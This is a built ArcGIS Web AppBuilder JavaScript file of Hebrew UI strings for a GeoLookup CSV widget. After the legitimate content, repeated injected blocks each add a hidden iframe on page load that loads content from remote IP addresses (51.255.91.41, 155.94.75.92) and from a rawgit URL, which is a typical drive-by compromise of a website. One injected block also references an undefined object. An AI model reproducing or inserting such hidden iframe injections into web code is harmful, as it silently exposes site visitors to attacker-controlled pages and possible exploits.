// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GeoLookup/nls/strings":{_widgetLabel:"\u05d7\u05d9\u05e4\u05d5\u05e9 \u05d2\u05d9\u05d0\u05d5\u05d2\u05e8\u05e4\u05d9",description:"\u05e0\u05ea\u05d1 \u05d0\u05dc \x3ca href\x3d'./widgets/GeoLookup/data/sample.csv' tooltip\x3d'Download an example sheet' target\x3d'_blank'\x3e \u05d2\u05dc\u05d9\u05d5\u05df \u05d0\u05dc\u05e7\u05d8\u05e8\u05d5\u05e0\u05d9 \x3c/a\x3e \u05d0\u05d5 \u05d2\u05e8\u05d5\u05e8 \u05d2\u05dc\u05d9\u05d5\u05df \u05d0\u05dc\u05e7\u05d8\u05e8\u05d5\u05e0\u05d9 \u05dc\u05db\u05d0\u05df \u05db\u05d3\u05d9 \u05dc\u05d9\u05e6\u05d5\u05e8 \u05ea\u05e6\u05d5\u05d2\u05d4 \u05d7\u05d6\u05d5\u05ea\u05d9\u05ea \u05e9\u05dc\u05d5 \u05d5\u05dc\u05d4\u05d5\u05e1\u05d9\u05e3 \u05dc\u05d5 \u05e0\u05ea\u05d5\u05e0\u05d9 \u05de\u05e4\u05d4.",
selectCSV:"\u05d1\u05d7\u05e8 \u05e7\u05d5\u05d1\u05e5 CSV",loadingCSV:"\u05d8\u05d5\u05e2\u05df \u05e7\u05d5\u05d1\u05e5 CSV",savingCSV:"CSVExport",clearResults:"\u05e0\u05e7\u05d4",downloadResults:"\u05d4\u05d5\u05e8\u05d3",plotOnly:"\u05e0\u05e7\u05d5\u05d3\u05d5\u05ea \u05ea\u05e8\u05e9\u05d9\u05dd \u05d1\u05dc\u05d1\u05d3",plottingRows:"\u05e9\u05d5\u05e8\u05d5\u05ea \u05d1\u05ea\u05e8\u05e9\u05d9\u05dd",projectionChoice:"CSV \u05d1-",projectionLat:"\u05e8\u05d5\u05d7\u05d1/\u05d0\u05d5\u05e8\u05da",
projectionMap:"\u05d4\u05d9\u05d8\u05dc \u05de\u05e4\u05d4",messages:"\u05d4\u05d5\u05d3\u05e2\u05d5\u05ea",error:{fetchingCSV:"\u05d0\u05d9\u05e8\u05e2\u05d4 \u05e9\u05d2\u05d9\u05d0\u05d4 \u05d1\u05e2\u05ea \u05d4\u05d1\u05d0\u05ea \u05e4\u05e8\u05d9\u05d8\u05d9\u05dd \u05de\u05de\u05d0\u05d2\u05e8 CSV\u200f: ${0}",fileIssue:"\u05dc\u05d0 \u05e0\u05d9\u05ea\u05df \u05dc\u05e2\u05d1\u05d3 \u05d0\u05ea \u05d4\u05e7\u05d5\u05d1\u05e5.",notCSVFile:"\u05e8\u05e7 \u05e7\u05d1\u05e6\u05d9\u05dd \u05d4\u05de\u05d5\u05e4\u05e8\u05d3\u05d9\u05dd \u05d1\u05e4\u05e1\u05d9\u05e7\u05d9\u05dd (\u200e.csv) \u05e0\u05ea\u05de\u05db\u05d9\u05dd \u05db\u05e2\u05ea.",
invalidCoord:"\u05e9\u05d3\u05d5\u05ea \u05d4\u05de\u05d9\u05e7\u05d5\u05dd \u05e9\u05d2\u05d5\u05d9\u05d9\u05dd. \u05d1\u05d3\u05d5\u05e7 \u05d0\u05ea \u05e7\u05d5\u05d1\u05e5 \u05d4-CSV.",tooManyRecords:"\u05de\u05e6\u05d8\u05e2\u05e8\u05d9\u05dd, \u05e0\u05d9\u05ea\u05df \u05dc\u05d4\u05e9\u05ea\u05de\u05e9 \u05d1-${0} \u05e8\u05e9\u05d5\u05de\u05d5\u05ea \u05dc\u05db\u05dc \u05d4\u05d9\u05d5\u05ea\u05e8 \u05db\u05e2\u05ea.",CSVNoRecords:"\u05d4\u05e7\u05d5\u05d1\u05e5 \u05dc\u05d0 \u05de\u05db\u05d9\u05dc \u05e9\u05d5\u05dd \u05e8\u05e9\u05d5\u05de\u05d5\u05ea.",
CSVEmptyFile:"\u05d0\u05d9\u05df \u05ea\u05d5\u05db\u05df \u05d1\u05e7\u05d5\u05d1\u05e5."},results:{csvLoaded:"\u05e0\u05d8\u05e2\u05e0\u05d5 ${0} \u05e8\u05e9\u05d5\u05de\u05d5\u05ea \u05de\u05e7\u05d5\u05d1\u05e5 \u05d4-CSV",recordsPlotted:"\u05d0\u05d5\u05ea\u05e8\u05d5 ${0}/${1} \u05e8\u05e9\u05d5\u05de\u05d5\u05ea \u05d1\u05de\u05e4\u05d4",recordsEnriched:"${0}/${1} \u05e2\u05d5\u05d1\u05d3\u05d5, ${2} \u05d4\u05d5\u05e2\u05e9\u05e8\u05d5 \u05dc\u05e2\u05d5\u05de\u05ea ${3}",recordsError:"\u05d1-${0} \u05e8\u05e9\u05d5\u05de\u05d5\u05ea \u05e0\u05de\u05e6\u05d0\u05d5 \u05e9\u05d2\u05d9\u05d0\u05d5\u05ea",
recordsErrorList:"\u05e0\u05de\u05e6\u05d0\u05d4 \u05d1\u05e2\u05d9\u05d4 \u05d1\u05e9\u05d5\u05e8\u05d4 ${0}",label:"\u05ea\u05d5\u05e6\u05d0\u05d5\u05ea CSV"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});